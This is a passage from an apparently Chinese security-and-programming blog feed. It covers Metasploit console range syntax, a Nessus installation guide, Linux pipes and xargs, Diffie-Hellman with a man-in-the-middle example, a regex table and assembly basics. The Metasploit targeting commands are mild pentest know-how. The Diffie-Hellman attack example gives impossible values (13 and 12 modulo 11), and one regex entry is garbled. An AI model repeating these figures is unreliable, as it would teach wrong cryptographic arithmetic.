reload_lib    从指定路径重新加载Ruby库文件</code></pre><h1 id="msfconsole"><a href="#msfconsole" class="headerlink" title="msfconsole"></a>msfconsole</h1><p><strong>msfconsole</strong>是Metasploit框架的主要接口。使用者可以通过这个控制台高效的使用MSF中的各种功能。<br>可以在终端或命令行界面直接输入<code>msfconsole</code>启动。</p>
<h2 id="范围和列表"><a href="#范围和列表" class="headerlink" title="范围和列表"></a>范围和列表</h2><p>上面列出的许多命令和选项都可以使用范围，所以不必手动列出每个需要的事物。所有范围均包括在内。</p>
<h3 id="ID范围"><a href="#ID范围" class="headerlink" title="ID范围"></a>ID范围</h3><p>带有ID列表的命令可以使用范围来提供帮助。各个ID必须以<code>,</code>分隔（不允许有空格），<br>范围可以用<code>-</code>或<code>..</code>表示。</p>
<h3 id="IP范围"><a href="#IP范围" class="headerlink" title="IP范围"></a>IP范围</h3><p>这里有多种方法可以用来指定能混合在一起的IP地址范围：</p>
<ul>
<li>第一种方法是一个IP列表，这些IP仅由<code>&#39; &#39;</code>（ASCII空格）分隔，并带有可选的<code>,</code>。</li>
<li>第二种方式是用两个完整的IP地址表示范围，格式为<em>“开始地址-结束地址”</em>，例如<code>127.0.1.44-127.0.2.33</code>。</li>
<li>也可以使用CIDR规范，但是，与RFC相反，必须将整个地址提供给Metasploit，例如127.0.0.0/8，而不是127/8。</li>
<li>此外，可以将网络掩码与域名一起使用以动态解析要定位的块。</li>
</ul>
<p>所有这些方法都适用于IPv4和IPv6地址。也可以根据<a href="https://nmap.org/book/man-target-specification.html" target="_blank" rel="noopener">NMAP目标规范</a>用特殊的八位位组范围指定IPv4地址。</p>
<h3 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h3><p>终止第一个会话：</p>
<pre><code>sessions -k 1</code></pre><p>停止一些正在运行的作业：</p>
<pre><code>jobs -k 2-6,7,8,11..15</code></pre><p>检查一组IP地址：</p>
<pre><code>check 127.168.0.0/16, 127.0.0-2.1-4,15 127.0.0.255</code></pre><p>定位一组IPv6主机：</p>
<pre><code>set RHOSTS fe80::3990:0000/110, ::1-::f0f0</code></pre><p>定位来自解析域名的块：</p>
<pre><code>set RHOSTS www.example.test/24</code></pre><blockquote>
<p>翻译：Boringboys<br>原文链接：<a href="https://www.boringboys.top/2019/03/29/Metasploit命令/">https://www.boringboys.top/2019/03/29/Metasploit命令/</a><br>版权声明：本文采用<a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank" rel="noopener">BY-NC-SA</a>协议授权，转载请遵守此协议</p>
</blockquote>
]]></content>
      <categories>
        <category>安全</category>
      </categories>
      <tags>
        <tag>工具</tag>
        <tag>安全</tag>
        <tag>学习</tag>
      </tags>
  </entry>
  <entry>
    <title>Nessus在Windows上的安装</title>
    <url>/2018/04/23/Nessus%E5%9C%A8Windows%E4%B8%8A%E7%9A%84%E5%AE%89%E8%A3%85/</url>
    <content><![CDATA[<h2 id="Nessus"><a href="#Nessus" class="headerlink" title="Nessus"></a>Nessus</h2><p><a href="https://baike.baidu.com/item/Nessus/10718713" target="_blank" rel="noopener">Nessus</a> 是目前全世界最多人使用的系统漏洞扫描与分析软件。<a id="more"></a>总共有超过75,000个机构使用Nessus 作为扫描该机构电脑系统的软件。</p>
<p>该工具提供完整的电脑漏洞扫描服务，并及时更新其漏洞数据库。</p>
<p>Nessus不同于传统的漏洞扫描工具，它可以同时在本机或远端上遥控，进行系统的漏洞分析扫描。</p>
<h2 id="获取安装包"><a href="#获取安装包" class="headerlink" title="获取安装包"></a>获取安装包</h2><p>Nessus的下载地址:<a href="https://www.tenable.com/downloads/nessus" target="_blank" rel="noopener">https://www.tenable.com/downloads/nessus</a><br>点击此链接在浏览器打开如下所示的界面：</p>
<img src="https://boringboys-1254394685.cos.ap-shanghai.myqcloud.com/img/Nessus_install/download_page.png" width="95%">

<p>然后选择要下载的版本，这里我选择的是Nessus-8.3.1-x64.msi，即Windows版的安装包；</p>
<h2 id="获取激活码"><a href="#获取激活码" class="headerlink" title="获取激活码"></a>获取激活码</h2><p>在使用Nessus之前，必须先激活服务才可以使用，激活服务的激活码可以在官网获取；</p>
<p>（1）首先在刚才的下载界面，可以看到一个“Get Activation Code”按钮，如下图所示，点击它即可前往获取激活码；</p>
<img src="https://boringboys-1254394685.cos.ap-shanghai.myqcloud.com/img/Nessus_install/get_code.png" width="95%">

<p>（2）然后会让你选择获取哪种激活码，如下图所示：  </p>
<ul>
<li>一种是Professional版的，即专业版，需要付费获得激活码；  </li>
<li>另外一种是Home版的，即免费版；<br>这里我选择了Home版，点击“Register Now”，前往注册界面；</li>
</ul>
<img src="https://boringboys-1254394685.cos.ap-shanghai.myqcloud.com/img/Nessus_install/chose_free.png" width="95%">

<p>（3）在注册界面填写信息以及邮箱，然后点击“Register”按钮，如下图；</p>
<img src="https://boringboys-1254394685.cos.ap-shanghai.myqcloud.com/img/Nessus_install/register.png" width="95%">

<p>（4）当显示如下所示的“Thank You for Registing …”页面时，说明你已经成功获得激活码，激活码以邮件形式发送到了你所填写的邮箱；</p>
<img src="https://boringboys-1254394685.cos.ap-shanghai.myqcloud.com/img/Nessus_install/thanks_page.png" width="95%">

<h2 id="安装Nessus"><a href="#安装Nessus" class="headerlink" title="安装Nessus"></a>安装Nessus</h2><p>（1）点击前面下载的xxx.msi安装包，安装Nessus；</p>
<img src="https://boringboys-1254394685.cos.ap-shanghai.myqcloud.com/img/Nessus_install/install.png" width="95%">

<p>按照安装导向成功安装Nessus后，会自动在浏览器打开一个如下图所示的页面，如果没有可以自己在浏览器输入“<a href="https://localhost:8834”打开；">https://localhost:8834”打开；</a></p>
<img src="https://boringboys-1254394685.cos.ap-shanghai.myqcloud.com/img/Nessus_install/create_account.png" width="95%">

<p>如果输入链接后无法访问，可能是Nessus服务没有运行，前往Nessus的安装目录点击执行“nessus-service.exe”即可，如图双击“nessus-service.exe”启动Nessus服务，<br>双击“Nessus Web Client”可以打开网页版客户端，即“http:localhost:8834”；</p>
<img src="https://boringboys-1254394685.cos.ap-shanghai.myqcloud.com/img/Nessus_install/nessus.png" width="95%">

<p>（2）在打开的“Create an account”页面，输入用户名和密码创建一个账号，以后再次打开此页面使用Nessus时，需要使用这里设置的用户名和密码登录；<br>（3）点击“Continue”后，会出现一个界面让你输入激活码，将前面获得的激活码输入然后继续；<br>（4）然后就是如下图所示的初始化界面了，这一步会下载并安装一些插件，时间会有点久，但没有任何操作，等它完成就可以了；</p>
<img src="https://boringboys-1254394685.cos.ap-shanghai.myqcloud.com/img/Nessus_install/nessus_initializing.png" width="95%">

<p>（5）完成之后，显示下面的界面，表示安装成功，你可以创建自己的扫描任务并执行了。</p>
<img src="https://boringboys-1254394685.cos.ap-shanghai.myqcloud.com/img/Nessus_install/success.png" width="95%">


<blockquote>
<p>作者：Boringboys<br>原文链接：<a href="https://www.boringboys.top/2019/04/23/Nessus在Windows上的安装/">https://www.boringboys.top/2019/04/23/Nessus在Windows上的安装/</a><br>版权声明：本文采用<a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank" rel="noopener">BY-NC-SA</a>协议授权，转载请遵守此协议</p>
</blockquote>
]]></content>
      <categories>
        <category>安全</category>
      </categories>
      <tags>
        <tag>工具</tag>
        <tag>安全</tag>
      </tags>
  </entry>
  <entry>
    <title>对linux管道和grep，xrags的学习</title>
    <url>/2021/01/16/%E5%AF%B9linux%E7%AE%A1%E9%81%93%E5%92%8Cgrep%EF%BC%8Cxrags%E7%9A%84%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<h2 id="管道"><a href="#管道" class="headerlink" title="管道"></a>管道</h2><p>在linux中，管道可以将两个或多个命令的输入输出链接起来<a id="more"></a>，它将上一个命令的标准输出重定向到下一个命令的标准输入<br>假设在当前目录下的结构是：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.</span><br><span class="line">├── a</span><br><span class="line">│   └── a.txt</span><br><span class="line">├── b</span><br><span class="line">│   └── b.txt</span><br><span class="line">├── c</span><br><span class="line">│   └── c.txt</span><br><span class="line">├── d</span><br><span class="line">│   └── d.txt</span><br><span class="line">├── e</span><br><span class="line">│   └── e.txt</span><br><span class="line">└── test.txt</span><br></pre></td></tr></table></figure>
<p>而文件 <code>test.txt</code> 内容是：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">c</span><br><span class="line">a</span><br><span class="line">b</span><br><span class="line">e</span><br><span class="line">d</span><br><span class="line">ab</span><br><span class="line">abc</span><br></pre></td></tr></table></figure>
<p>通过执行下面命令，<code>cat</code> 会将文件 <code>test.txt</code> 的内容打印到标准输出，但不会直接显示在标准输出设备上，而是会通过管道 <code>|</code> 重定向到 <code>sort</code> 并被 <code>sort</code> 排序之后再进行打印:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ cat test.txt | sort</span><br><span class="line">a</span><br><span class="line">ab</span><br><span class="line">abc</span><br><span class="line">b</span><br><span class="line">c</span><br><span class="line">d</span><br><span class="line">e</span><br></pre></td></tr></table></figure>

<blockquote>
<p>对于管道，由它串起来的命令实际上不是依次执行的，而是同时执行的，Linux会在系统内部将它们连接起来，在前面的命令产生输出的同时，输出会被立即送给后面的命令 </p>
</blockquote>
<p>这里要注意的是，在这种使用方式中，后面的命令一定要支持接收标准输入，如果是 <code>ls</code> 这种不支持接收标准输入的命令，就会出现下面这种情况：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ cat test.txt | ls</span><br><span class="line">a  b  c  d  e  test.txt</span><br></pre></td></tr></table></figure>
<p>显然显示的内容只是 <code>ls</code> 命令的输出结果</p>
<h2 id="grep命令"><a href="#grep命令" class="headerlink" title="grep命令"></a>grep命令</h2><p><code>grep</code> 命令会从给定的文件中或者标准输入中搜索匹配的行或文本并输出</p>
<p>因为 <code>grep</code> 命令是支持接收标准输入的，所以它也可以作为管道后面的命令来处理前面命令的输出，如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ cat test.txt | sort | grep a</span><br><span class="line">a</span><br><span class="line">ab</span><br><span class="line">abc</span><br></pre></td></tr></table></figure>
<p><code>grep a</code> 会对前面命令的结果进行筛选，并只将包含字符 <code>a</code> 的行打印出来</p>
<p>这里也可以看出来，在一条命令里可以使用多条管道。实际上，只要你想，可以在命令里使用任意多条管道，如：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cat test.txt | sort | grep a | grep b | grep c</span><br></pre></td></tr></table></figure>

<h2 id="xargs命令"><a href="#xargs命令" class="headerlink" title="xargs命令"></a>xargs命令</h2><p><code>xargs</code> 命令可以将标准输入转换为命令行参数</p>
<p>还是上面的命令，这次通过管道链接到 <code>xargs</code>，效果如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ cat test.txt | sort | xargs</span><br><span class="line">a ab abc b c d e</span><br></pre></td></tr></table></figure>

<p>回到前面，我们知道 <code>ls</code> 命令是不支持接收标准输入的，但我们可以通过 <code>xrags</code> 命令将标准输入转换成参数后传递给 <code>ls</code> 并进一步执行，如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ cat test.txt | xargs ls</span><br><span class="line">ls: cannot access &#39;ab&#39;: No such file or directory</span><br><span class="line">ls: cannot access &#39;abc&#39;: No such file or directory</span><br><span class="line">a:</span><br><span class="line">a.txt</span><br><span class="line"></span><br><span class="line">b:</span><br><span class="line">b.txt</span><br><span class="line"></span><br><span class="line">c:</span><br><span class="line">c.txt</span><br><span class="line"></span><br><span class="line">d:</span><br><span class="line">d.txt</span><br><span class="line"></span><br><span class="line">e:</span><br><span class="line">e.txt</span><br></pre></td></tr></table></figure>
<p><code>cat test.txt</code> 的输出被管道重定向到后面的命令，并由 <code>xargs</code> 转换成参数传递给了 <code>ls</code>，然后依次执行，就分别列出了对应目录的内容，或者报出文件不存在的错误</p>
<p>对于 <code>xargs</code> 命令还可以通过参数 <code>-I</code> 指定其转换后的参数在后面命令中的位置，比如我们想将 <code>test.txt</code> 文件中所列的目录拷贝到 <code>./test/</code> 中，就可以用下面命令：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cat test.txt | xargs -I &#123;&#125; cp -r &#123;&#125; .&#x2F;test&#x2F;</span><br></pre></td></tr></table></figure>
<p>执行结果如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ cat test.txt | xargs -I &#123;&#125; cp -r &#123;&#125; .&#x2F;test&#x2F;</span><br><span class="line">cp: cannot stat &#39;ab&#39;: No such file or directory</span><br><span class="line">cp: cannot stat &#39;abc&#39;: No such file or directory</span><br><span class="line"></span><br><span class="line">$ ls test</span><br><span class="line">a  b  c  d  e</span><br></pre></td></tr></table></figure>
<p>可以看到，结果会把 <code>test.txt</code> 中列出来并且存在的目录拷贝到 <code>./test/</code> 目录下</p>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>grep</tag>
        <tag>xargs</tag>
        <tag>管道</tag>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>密码学 Diffie-Hellman密钥交换协议</title>
    <url>/2018/12/04/%E5%AF%86%E7%A0%81%E5%AD%A6Diffie-Hellman%E5%AF%86%E9%92%A5%E4%BA%A4%E6%8D%A2%E5%8D%8F%E8%AE%AE/</url>
    <content><![CDATA[<h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><p><strong>Diffie-Hellman密钥交换协议</strong>（Diffie-Hellman key exchange agreement）简称“D-H<strong>协议</strong>”<a id="more"></a>，是1976年 Whitfield Diffie 和 Martin Hellman 合作发明的安全协议，它可以让双方在完全没有对方任何预先信息的条件下通过不安全信道创建起一个密钥。这个密钥可以在后续的通信中作为对称密钥来加密通信内容。</p>
<h2 id="算法描述"><a href="#算法描述" class="headerlink" title="算法描述"></a>算法描述</h2><p>（1）通信双方 Alice 和 Bob 先确定<em>两个大素数</em> p 和 q ，这两个数不需要保密，因此通信双方可以通过不安全信道协商并确定这两个数；</p>
<p>（2）Alice 选择一个大的<em>随机数</em> <code>r1</code> 并计算：<code>A=q^r1 (mod p)</code>；</p>
<p>（3）Alice 将 <code>A</code> 发送给 Bob；</p>
<p>（4）Bob 选择另外一个大的<em>随机数</em> <code>r2</code> 并计算：<code>B=q^r2 (mod p)</code>；</p>
<p>（5）Bob 将 <code>B</code> 发送给 Alice；</p>
<p>（6）Alice 计算密钥：<code>k1=B^r1 (mod p)</code>；</p>
<p>（7）Bob 计算密钥：<code>k2=A^r2 (mod p)</code></p>
<p>ps:最后，Alice 和 Bob 计算得到的 <code>k1=k2</code>，即得到的密钥</p>
<h2 id="举例"><a href="#举例" class="headerlink" title="举例"></a>举例</h2><p>（1）假设 Alice 和 Bob 选取的 <code>p=11 ， q=5</code>；</p>
<p>（2）Alice 选择的随机数取 <code>r1=3</code>，则 <code>A=5^3 (mod 11)=4</code>；</p>
<p>（3）Alice 将 <code>A=4</code> 发送给 Bob；</p>
<p>（4）Bob 选择的随机数取 <code>r2=6</code>，则 <code>B=5^6 (mod 11)=5</code>；</p>
<p>（5）Bob 将 <code>B=5</code> 发送给 Alice；</p>
<p>（6）Alice 计算：<code>k1=5^3 (mod 11)=4</code>；</p>
<p>（7）Bob 计算：<code>k2=4^6 (mod 11)=4</code>；</p>
<p>（8）交换得到的密钥：<code>k1=k2=4</code></p>
<h2 id="安全性"><a href="#安全性" class="headerlink" title="安全性"></a>安全性</h2><p><em>D-H协议的安全性在于，在有限域中计算离散对数远远难于在同一个域中计算指数。</em></p>
<p>从上面给出的例子解释，就是当 Alice 知道 r1=3，以及 p 和 q 的情况下可以十分容易的计算得到 A；<br>而第三方在只知道 p，q 和 A 的情况下却很难计算得到 Alice 取得随机数 r1，所以无法使用 Bob 通过公共信道发送的 B 计算得到密钥 k；<br>对于 Bob 取的随机数 r2，与对 Alice 的分析一样，第三方同样难以通过计算得到，也就难以通过 Alice 发送的 A 计算出密钥。</p>
<h2 id="缺陷"><a href="#缺陷" class="headerlink" title="缺陷"></a>缺陷</h2><p>D-H协议也存在缺陷，即容易受到<strong>中间人攻击</strong> ( <strong>Man-in-the-Middle Attack</strong> ，简称 <strong>“MITM攻击”</strong> ) ，就是通过拦截正常的网络通信数据，并进行数据篡改和嗅探，而通信双方却毫不知情。</p>
<p>中间人攻击的过程如下：</p>
<p>（1）第一步和上面所说的一样，通信双方 Alice 和 Bob 先确定两个大素数 <code>p</code> 和 <code>q</code> ，这两个数不需要保密，因此通信双方可以通过不安全信道协商并确定这两个数；<br>设 <code>p=11 ，q=5</code>；</p>
<p>（2）窥探者 Eve 监听他们两个的会话，并得到了 <code>p</code> 和 <code>q</code> 的值；</p>
<p>（3）Alice、Bob、Eve 同时选择随机数：<br>设 Alice 选择的还是 <code>r1=3</code> ，Bob 选择的是 <code>r2=6</code>，Eve 选择两个随机数 <code>r1&#39;=8，r2&#39;=9</code>；</p>
<p>（4）Alice、Bob、Eve 分别计算 <code>q^r (mod p)</code>：<br>Alice 计算得 <code>A=4</code> ，Bob 计算得 <code>B=5</code> ，Eve 计算得 <code>A&#39;=13,B&#39;=12</code></p>
<p>（5）然后按照协议 Alice 将自己计算的 <code>A</code> 发送给 Bob，此时 Eve 截获这个 <code>A</code>，并将自己计算得到的 <code>A&#39;</code> 发送给 Bob，Bob 对此过程并不知情；</p>
<p>（6）同样 Eve 也截获了 Bob 发送给 Alice 的 <code>B</code>，并将 <code>B&#39;</code> 发送给 Alice，Alice 同样对此过程毫不知情；</p>
<p>（7）此时 Eve 可以根据截获的 <code>A</code> 、<code>B</code> 分别计算出 <em>自己和 Alice 通信的密钥</em> 以及 <em>自己和Bob通信的密钥</em>，分别与 Alice 、Bob 共享不同的密钥。</p>
<p>这样一来，Eve 就可以分别与 Alice 和 Bob 通信，而 Alice 和 Bob 仍认为和自己通信的是对方，对第三方并不知情。</p>
<blockquote>
<p>作者：Boringboys<br>原文链接：<a href="https://www.boringboys.top/2018/12/04/密码学Diffie-Hellman密钥交换协议/">https://www.boringboys.top/2018/12/04/密码学Diffie-Hellman密钥交换协议/</a><br>版权声明：本文采用<a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank" rel="noopener">BY-NC-SA</a>协议授权，转载请遵守此协议</p>
</blockquote>
]]></content>
      <categories>
        <category>密码学</category>
      </categories>
      <tags>
        <tag>安全</tag>
        <tag>学习</tag>
      </tags>
  </entry>
  <entry>
    <title>正则表达式</title>
    <url>/2019/05/09/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/</url>
    <content><![CDATA[<p><strong>正则表达式</strong>，又称规则表达式。（英语：Regular Expression，代码中简写为regex、regexp或RE），计算机科学的一个概念。<a id="more"></a><br>正则表达式通常被用来检索、替换那些符合某个模式(规则)的文本。</p>
<p>正则表达式由一些普通字符和一些元字符（metacharacters）组成。普通字符包括大小写的字母和数字，而元字符则具有特殊的含义。</p>
<p>下表列出了所有的元字符和对它们的描述。</p>
<table>
 <tr>
  <th>字符</th><th>描述</th> 
</tr>
 <tr>
  <td>\</td><td>将下一个字符标记为特殊字符、或一个原义字符、或一个向后引用、或一个八进制转义符。</td> 
</tr>
 <tr>
  <td>^</td><td>匹配输入字符串的开始位置。</td> 
</tr>
 <tr>
  <td>$</td><td>匹配输入字符串的结束位置。</td> 
</tr>
 <tr>
  <td>*</td><td>匹配前面的子表达式零次或多次。</td> 
</tr>
 <tr>
  <td>+</td><td>匹配前面的子表达式一次或多次。</td> 
</tr>
 <tr>
  <td>?</td><td>匹配前面的子表达式零次或一次。</td> 
</tr>
 <tr>
  <td>{n}</td><td>n 是一个非负整数。匹配确定的 n 次。</td> 
</tr>
 <tr>
  <td>{n,}</td><td>n 是一个非负整数。至少匹配n 次。</td> 
</tr>
 <tr>
  <td>{n,m}</td><td>m和n均为非负整数，其中n<=m。最少匹配n次且最多匹配m次。</td> 
</tr>
 <tr>
  <td>?</td><td>当该字符紧跟在任何一个其他限制符（*,+,?，{n}，{n,}，{n,m}）后面时，匹配模式是非贪婪的。非贪婪模式尽可能少地匹配所搜索的字符串，而默认的贪婪模式则尽可能多地匹配所搜索的字符串。</td> 
</tr>
 <tr>
  <td>.</td><td>匹配除换行符（\n、\r）之外的任何单个字符。</td> 
</tr>
 <tr>
  <td>(pattern)</td><td>匹配pattern并获取这一匹配。</td> 
</tr>
 <tr>
  <td>(?:pattern)</td><td>非获取匹配，匹配pattern但不获取匹配结果，不进行存储供以后使用。这在使用或字符“(|)”来组合一个模式的各个部分时很有用。</td> 
</tr>
 <tr>
  <td>(?=pattern)</td><td>非获取匹配，正向肯定预查，在任何匹配pattern的字符串开始处匹配查找字符串，该匹配不需要获取供以后使用。</td> 
</tr>
 <tr>
  <td>(?!pattern)</td><td>非获取匹配，正向否定预查，在任何不匹配pattern的字符串开始处匹配查找字符串，该匹配不需要获取供以后使用。</td> 
</tr>
 <tr>
  <td>(?<=pattern)</td><td>非获取匹配，反向肯定预查，与正向肯定预查类似，只是方向相反。</td> 
</tr>
 <tr>
  <td>(?<<e>!patte_n)</td><td>非获取匹配，反向否定预查，与正向否定预查类似，只是方向相反。</td> 
</tr>
 <tr>
  <td>x|y</td><td>匹配x或y。</td> 
</tr>
 <tr>
  <td>[xyz]</td><td>字符集合。匹配所包含的任意一个字符。</td> 
</tr>
 <tr>
  <td>[^xyz]</td><td>负值字符集合。匹配未包含的任意字符。</td> 
</tr>
<tr>
  <td>[a-z]</td><td>字符范围。匹配指定范围内的任意字符。</td> 
</tr>
<tr>
  <td>[^a-z]</td><td>负值字符范围。匹配任何不在指定范围内的任意字符。</td> 
</tr>
<tr>
  <td>\b</td><td>匹配一个单词的边界，也就是指单词和空格间的位置（即正则表达式的“匹配”有两种概念，一种是匹配字符，一种是匹配位置，这里的\b就是匹配位置的）。</td> 
</tr>
<tr>
  <td>\B</td><td>匹配非单词边界。</td> 
</tr>
<tr>
  <td>\cx</td><td>匹配由x指明的控制字符。</td> 
</tr>
<tr>
  <td>\d</td><td>匹配一个数字字符。等价于[0-9]。grep 要加上-P，perl正则支持。</td> 
</tr>
<tr>
  <td>\D</td><td>匹配一个非数字字符。等价于[^0-9]。grep要加上-P，perl正则支持。</td> 
</tr>
<tr>
  <td>\f</td><td>匹配一个换页符。等价于\x0c和\cL。</td> 
</tr>
<tr>
  <td>\n</td><td>匹配一个换行符。等价于\x0a和\cJ。</td> 
</tr>
<tr>
  <td>\r</td><td>匹配一个回车符。等价于\x0d和\cM。</td> 
</tr>
<tr>
  <td>\s</td><td>匹配任何不可见字符，包括空格、制表符、换页符等等。等价于[ \f\n\r\t\v]。</td> 
</tr>
<tr>
  <td>\S</td><td>匹配任何可见字符。等价于[^ \f\n\r\t\v]。</td> 
</tr>
<tr>
  <td>\t</td><td>匹配一个制表符。等价于\x09和\cI。</td> 
</tr>
<tr>
  <td>\v</td><td>匹配一个垂直制表符。等价于\x0b和\cK。</td> 
</tr>
<tr>
  <td>\w</td><td>匹配包括下划线的任何单词字符。类似但不等价于“[A-Za-z0-9_]”，这里的"单词"字符使用Unicode字符集。</td> 
</tr>
<tr>
  <td>\W</td><td>匹配任何非单词字符。等价于“[^A-Za-z0-9_]”。</td> 
</tr>
<tr>
  <td>\xn</td><td>匹配n，其中n为十六进制转义值。十六进制转义值必须为确定的两个数字长。</td> 
</tr>
<tr>
  <td>\num</td><td>匹配num，其中num是一个正整数。对所获取的匹配的引用。</td> 
</tr>
<tr>
  <td>\n</td><td>标识一个八进制转义值或一个向后引用。如果\n之前至少n个获取的子表达式，则n为向后引用。否则，如果n为八进制数字（0-7），则n为一个八进制转义值。</td> 
</tr>
<tr>
  <td>\nm</td><td>标识一个八进制转义值或一个向后引用。如果\nm之前至少有nm个获得子表达式，则nm为向后引用。如果\nm之前至少有n个获取，则n为一个后跟文字m的向后引用。如果前面的条件都不满足，若n和m均为八进制数字（0-7），则\nm将匹配八进制转义值nm。</td> 
</tr>
<tr>
  <td>\nml</td><td>如果n为八进制数字（0-7），且m和l均为八进制数字（0-7），则匹配八进制转义值nml。</td> 
</tr>
<tr>
  <td>\un</td><td>匹配n，其中n是一个用四个十六进制数字表示的Unicode字符。</td> 
</tr>

<tr>
  <td>\p{P}</td><td>小写 p 是 property 的意思，表示 Unicode 属性，用于 Unicode 正表达式的前缀。中括号内的“P”表示Unicode 字符集七个字符属性之一：<br/>标点字符。
<br/>其他六个属性：<br/>
L：字母；<br/>
M：标记符号（一般不会单独出现）；<br/>
Z：分隔符（比如空格、换行等）；<br/>
S：符号（比如数学符号、货币符号等）；<br/>
N：数字（比如阿拉伯数字、罗马数字等）；<br/>
C：其他字符。<br/><br/>
ps:部分语言不支持此语法</td> 
</tr>
<tr>
  <td>\<<br/>\></td><td>匹配词（word）的开始（\<）和结束（\>）。</td> 
</tr>
<tr>
  <td>( )</td><td>将( 和 ) 之间的表达式定义为“组”（group），并且将匹配这个表达式的字符保存到一个临时区域（一个正则表达式中最多可以保存9个），它们可以用 \1 到\9 的符号来引用。</td> 
</tr>
<tr>
  <td>|</td><td>将两个匹配条件进行逻辑“或”（Or）运算。</td> 
</tr>
</table>

<blockquote>
<p>作者：Boringboys<br>原文链接：<a href="https://www.boringboys.top/2019/05/09/正则表达式/">https://www.boringboys.top/2019/05/09/正则表达式/</a><br>版权声明：本文采用<a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank" rel="noopener">BY-NC-SA</a>协议授权，转载请遵守此协议</p>
</blockquote>
]]></content>
      <categories>
        <category>编程</category>
      </categories>
      <tags>
        <tag>正则匹配</tag>
      </tags>
  </entry>
  <entry>
    <title>汇编语言学习笔记（一）</title>
    <url>/2018/06/11/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%B8%80%EF%BC%89/</url>
    <content><![CDATA[<h2 id="汇编语言的产生"><a href="#汇编语言的产生" class="headerlink" title="汇编语言的产生"></a>汇编语言的产生</h2><a id="more"></a>

<h3 id="机器语言"><a href="#机器语言" class="headerlink" title="机器语言"></a>机器语言</h3><p>首先，我们了解一下<strong>机器语言</strong>，机器语言是机器指令的集合。  </p>
<p><strong>机器指令</strong>就是CPU可以正确执行的命令。实际上就是一列二进制数字。CPU内部将这些二进制数字转变成对应的一列高低电平，然后驱动电子器件进行运算。  </p>
<p>CPU具体的工作原理这里就不深入的说了，感兴趣的读者可以自己搜索学习。  </p>
<p>我们都知道CPU是一种微处理器，对于不同的微处理器由于硬件设计和结构的不同，会需要不同的电平脉冲来驱动电子器件，进行运算。所以每种处理器都有自己的机器指令集（像x86架构的CPU和ARM架构的CPU就是拥有各自的指令集），这些指令集就是<strong>机器语言</strong>。  </p>
<p>所以，对于不同架构的CPU，可使用的机器语言也不同。</p>
<h3 id="汇编语言"><a href="#汇编语言" class="headerlink" title="汇编语言"></a>汇编语言</h3><p>早期的程序设计就是用的机器语言，程序员们使用 0、1 数字进行编程。机器语言过于抽象，使用机器语言实现的代码晦涩难懂、不易查错，而且难于记忆和分辨。于是就产生了<strong>汇编语言</strong>。  </p>
<p><strong>汇编语言</strong>的主体是汇编指令。汇编指令和机器指令是一一对应的，可以理解成把机器指令对应成了便于记忆的书写格式。<br>例如：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">机器指令 1000100111011000  </span><br><span class="line">对应的  </span><br><span class="line">汇编指令 mov ax,bx  </span><br><span class="line">所表示的操作就是：将寄存器BX的内容送到AX中</span><br></pre></td></tr></table></figure>

<p>程序员可以用汇编语言编写源程序，给计算机执行时，要先用<strong>编译器</strong>将程序员写的 <em>汇编语言</em> 编译为 <em>机器码</em> ，然后才能被计算机理解并执行。</p>
<h2 id="汇编语言的组成"><a href="#汇编语言的组成" class="headerlink" title="汇编语言的组成"></a>汇编语言的组成</h2><p>汇编语言包括3类指令：  </p>
<ol>
<li>汇编指令：机器指令的助记符，对应特定的机器码  </li>
<li>伪指令：没有对应的机器码，由编译器执行，计算机不执行  </li>
<li>其他符号：由编译器识别，没有对应的机器码，如+、-、*、/等  </li>
</ol>
<p>其中，汇编指令是汇编语言的核心。  </p>
<h2 id="存储器"><a href="#存储器" class="headerlink" title="存储器"></a>存储器</h2><p>提供给CPU的指令和数据存放在存储器中，这里说的存储器指的是内存，与磁盘不同的是，内存中的数据是可以直接被CPU使用的。</p>
<h2 id="地址总线"><a href="#地址总线" class="headerlink" title="地址总线"></a>地址总线</h2><p>CPU通过<strong>地址总线</strong>来指定存储单元。  </p>
<h2 id="数据总线"><a href="#数据总线" class="headerlink" title="数据总线"></a>数据总线</h2><p>CPU和各种器件之间是通过<strong>数据总线</strong>来传送数据的，<em>数据总线</em>的宽度决定了CPU和其它器件之间的数据是传送速度。  </p>
<h2 id="控制总线"><a href="#控制总线" class="headerlink" title="控制总线"></a>控制总线</h2><p>CPU对外部器件的控制是通过<strong>控制总线</strong>实现的。控制总线是一些不同控制线的集合，有多少控制线就表示CPU提供了多少种对外部器件的控制，也就是说，<em>控制总线</em>的宽度决定了CPU对外部器件的控制能力。</p>
]]></content>
      <categories>
        <category>汇编语言</category>
      </categories>
      <tags>
        <tag>汇编语言</tag>
      </tags>
  </entry>
  <entry>
    <title>广播域和冲突域</title>
    <url>/2019/05/24/%E7%BD%91%E7%BB%9C%E7%AF%87%E4%B9%8B%E5%B9%BF%E6%92%AD%E5%9F%9F%E5%92%8C%E5%86%B2%E7%AA%81%E5%9F%9F/</url>
